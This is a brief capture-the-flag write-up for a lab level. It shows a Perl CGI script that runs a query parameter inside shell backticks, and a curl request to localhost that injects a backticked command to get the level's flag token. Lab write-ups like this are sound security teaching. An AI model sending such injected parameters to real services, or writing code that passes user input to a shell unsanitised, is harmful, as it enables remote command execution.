# Level 04

## step 1 : analyze level04.pl
```
$ cat ./level04.pl
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

## step 2 : shell injection
```
$ curl localhost:4747/?x=\`getflag\`
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
